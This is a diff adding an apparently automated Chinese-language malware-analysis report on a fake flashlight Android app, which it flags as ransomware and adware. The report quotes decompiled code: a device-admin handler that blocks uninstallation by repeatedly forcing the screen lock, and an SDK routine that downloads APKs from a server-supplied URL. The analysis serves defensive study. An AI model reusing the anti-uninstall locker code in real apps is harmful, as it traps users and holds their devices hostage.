@@ -1,0 +1,107 @@
+{
+  "APK信息": {
+    "文件名": "0f5437a235b9a45c734ba3c3bf91b04f90266ba6392cb64766d43b8f6dc4b3b3.apk",
+    "sha256": "0f5437a235b9a45c734ba3c3bf91b04f90266ba6392cb64766d43b8f6dc4b3b3",
+    "包名": "com.shark.superflashlight",
+    "应用名": "MyFlashlight",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 581.9
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\shark\\superflashlight\\MyDeviceReceiver;",
+          "method_signature": "onDisableRequested(Context context, Intent intent)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public CharSequence onDisableRequested(Context context, Intent intent) {\n    Intent outOfDialog = context.getPackageManager().getLaunchIntentForPackage(\"com.android.settings\");\n    context.startActivity(outOfDialog);\n    final DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n    dpm.lockNow();\n    new Thread(new Runnable() {\n        public void run() {\n            int i = 0;\n            while (i < 70) {\n                dpm.lockNow();\n                Thread.sleep(100L);\n                i++;\n            }\n        }\n    }).start();\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.admin.DeviceAdminReceiver\n>>>     public CharSequence onDisableRequested(Context context, Intent intent) {\n>>>         Intent outOfDialog = context.getPackageManager().getLaunchIntentForPackage(\"com.android.settings\");\n>>>         outOfDialog.setFlags(DriveFile.MODE_READ_ONLY);\n>>>         context.startActivity(outOfDialog);\n>>>         final DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>         dpm.lockNow();\n>>>         new Thread(new Runnable() { // from class: com.shark.superflashlight.MyDeviceReceiver.1\n>>>             @Override // java.lang.Runnable\n>>>             public void run() {\n>>>                 int i = 0;\n>>>                 while (i < 70) {\n>>>                     dpm.lockNow();\n>>>                     try {\n>>>                         Thread.sleep(100L);\n>>>                         i++;\n>>>                     } catch (InterruptedException e) {\n                          e.printStackTrace();\n                      }\n                  }",
+          "behavior_description": "该代码是典型的勒索软件设备锁定（device locker）行为。当用户尝试停用设备管理员权限以卸载该应用时，系统触发 onDisableRequested 回调：代码首先启动系统设置页面（com.android.settings）覆盖在'取消激活'确认对话框之上，干扰用户操作；随后立即调用 DevicePolicyManager.lockNow() 锁定屏幕，并启动子线程在约 7 秒内循环调用 lockNow() 70 次，反复强制锁屏，使用户无法完成取消设备管理员的操作，从而将设备劫持锁定。数据流向：用户尝试停用设备管理员触发系统回调（source）→ 循环调用 dpm.lockNow() 强制锁屏（sink），属于伪装成手电筒应用的勒索软件典型反卸载/锁屏逻辑。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\yeahmobi\\android\\common\\util\\ApkUtil;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 11)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));\nrequest.setDestinationInExternalPublicDir(downloadStandardDir, app_name);\nrequest.setMimeType(\"application/vnd.android.package-archive\");\nlong downloadId = downloadManager.enqueue(request);\nPreferenceManager.getDefaultSharedPreferences(context).edit().putLong(\"yeahmobi_download_id\", downloadId);\nFile apkFile = tryGetLocalApkFile(app_name);",
+          "malicious_code_snippet_context": "              folder.mkdirs();\n          }\n          String app_name = url.substring(url.lastIndexOf(\"/\") + 1, url.length());\n>>>         DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));\n>>>         request.setDestinationInExternalPublicDir(downloadStandardDir, app_name);\n>>>         request.setTitle(\"Downloading [\" + app_name + \"] ...\");\n>>>         if (Build.VERSION.SDK_INT >= 11) {\n>>>             Log.e(\"guard\", Build.VERSION.SDK_INT + \"\");\n>>>             request.setNotificationVisibility(1);\n          }\n          request.setVisibleInDownloadsUi(true);\n          request.setMimeType(\"application/vnd.android.package-archive\");",
+          "behavior_description": "该代码属于YeahMobi广告SDK的ApkUtil工具类，实现从远程服务器URL下载APK文件并准备安装的完整链路：首先从url参数（由广告SDK服务器下发）提取文件名，通过系统DownloadManager将MIME类型为application/vnd.android.package-archive的APK文件下载到外部公共存储目录，并将downloadId持久化到SharedPreferences（yeahmobi_download_id），随后visit_from_http方法通过tryGetLocalApkFile检索已下载的本地APK文件以触发后续安装流程。数据流向：远程服务器下发URL → DownloadManager.enqueue()静默下载APK到本地存储 → 检索本地APK → 触发安装。虽然下载设置了可见通知（setNotificationVisibility(1)），但在已确认恶意的样本中，该下载-安装链路属于典型的广告SDK静默推广应用行为，可能被用于分发和安装额外恶意载荷。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
